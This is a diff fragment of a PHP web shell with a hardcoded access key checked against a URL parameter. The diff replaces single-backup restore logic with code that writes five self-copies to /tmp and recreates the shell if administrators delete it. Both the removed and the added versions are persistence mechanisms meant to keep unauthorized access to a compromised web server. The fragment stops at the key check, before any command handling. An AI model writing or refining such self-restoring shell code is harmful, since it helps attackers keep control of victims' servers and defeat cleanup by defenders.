@@ -10,36 +10,27 @@
 $AUTH_KEY = 'InViSiBLe55SOLe';
 $PARAM_NAME = 'x';
 
-$backup_files = glob("/tmp/f_*.php");
-$backup_file = !empty($backup_files) ? $backup_files[0] : null;
-
-if(!$backup_file) {
-    $backup_file = "/tmp/f_" . bin2hex(random_bytes(8)) . ".php";
-    $shell_code = file_get_contents(__FILE__);
-    
-    $shell_code = preg_replace(
-        '/\$AUTH_KEY\s*=\s*[\'"].*?[\'"]/',
-        '$AUTH_KEY = \'' . $AUTH_KEY . '\'',
-        $shell_code
-    );
-    
-    file_put_contents($backup_file, $shell_code);
-    chmod($backup_file, 0755);
+$fileku = __FILE__;
+if (!file_exists($fileku)) {
+    $tmp_files = glob("/tmp/f_*.php");
+    if (!empty($tmp_files)) {
+        $backup = $tmp_files[0];
+        $isi = @file_get_contents($backup);
+        if ($isi && strlen($isi) > 10) {
+            file_put_contents($fileku, $isi);
+            chmod($fileku, 0644);
+        }
+    }
 }
 
-if(!file_exists(__FILE__) && $backup_file && file_exists($backup_file)) {
-    copy($backup_file, __FILE__);
-    chmod(__FILE__, 0755);
-    // Redirect biar tetep akses
-    header('Location: ' . $_SERVER['PHP_SELF'] . '?' . $_SERVER['QUERY_STRING']);
-    exit;
-}
-
-if(isset($_GET['r']) && $backup_file && file_exists($backup_file)) {
-    copy($backup_file, __FILE__);
-    chmod(__FILE__, 0755);
-    echo "Shell restored from backup!";
-    exit;
+$existing = glob("/tmp/f_*.php");
+if (count($existing) < 5) {
+    $my_content = file_get_contents(__FILE__);
+    for ($i = 1; $i <= 5; $i++) {
+        $backup_file = "/tmp/f_" . uniqid() . ".php";
+        @file_put_contents($backup_file, $my_content);
+        @chmod($backup_file, 0644);
+    }
 }
 
 if(!isset($_GET[$PARAM_NAME]) || $_GET[$PARAM_NAME] !== $AUTH_KEY) {
